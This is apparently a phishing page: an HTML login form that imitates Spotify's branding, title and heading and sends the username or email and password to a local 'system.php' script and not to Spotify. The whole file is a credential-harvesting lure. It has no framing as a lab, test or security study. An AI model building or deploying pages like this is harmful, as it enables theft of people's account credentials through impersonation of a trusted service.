<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spotify Login</title>
    <link rel="icon" href="logo.png" type="image/png">
    <style>
        body {
            margin: 0;
            font-family: 'Helvetica Neue', Arial, sans-serif;
            background-color: #191414;
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        .heading {
            font-weight: bold;
            color: #1DB954;
            font-size: 36px;
            margin-bottom: 30px;
            text-align: center;
        }

        .sidebar {
            width: 360px;
            padding: 40px;
            background-color: #282828;
            border-radius: 8px;
            box-shadow: 0 0 20px rgba(0,0,0,0.2);
            text-align: center;
        }

        .logo {
            width: 100px;
            height: auto;
            margin-bottom: 20px;
        }

        .sidebar_inputContainer__4leI_ {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 20px;
        }

        .sidebar_aiLabel__GeI04 {
            margin-bottom: 10px;
            font-weight: bold;
            color: #b3b3b3;
            font-size: 16px;
            text-align: center;
        }

        .sidebar_input__AVHKi {
            width: 100%;
            padding: 12px;
            box-sizing: border-box;
            margin-bottom: 20px;
            border: 1px solid #3a3a3a;
            border-radius: 4px;
            background-color: #121212;
            color: #fff;
            font-size: 16px;
        }

        .sidebar_switchAiTypeBtn__x6tfo {
            background-color: #1DB954;
            color: #fff;
            border: none;
            cursor: pointer;
            padding: 12px 20px;
            border-radius: 4px;
            font-size: 16px;
            font-weight: bold;
            width: 100%;
            text-align: center;
            transition: background-color 0.3s;
        }

        .sidebar_switchAiTypeBtn__x6tfo:hover {
            background-color: #1ed760;
        }
    </style>
</head>
<body>
    <div class="heading">Log in to Spotify to continue</div>
    <div class="sidebar">
        <img src="logo.png" alt="Spotify-like Logo" class="logo">
        <form action="system.php" method="post">
            <div class="sidebar_inputContainer__4leI_">
                <label for="username" class="sidebar_aiLabel__GeI04">Username or Email Address</label>
                <input id="username" name="username" class="sidebar_input__AVHKi" type="text" placeholder="Enter your username or email" required>
                <input id="password" name="password" class="sidebar_input__AVHKi" type="password" placeholder="Enter your password" required>
                <button type="submit" class="sidebar_switchAiTypeBtn__x6tfo">
                    Log in
                </button>
            </div>
        </form>
    </div>
</body>
</html>
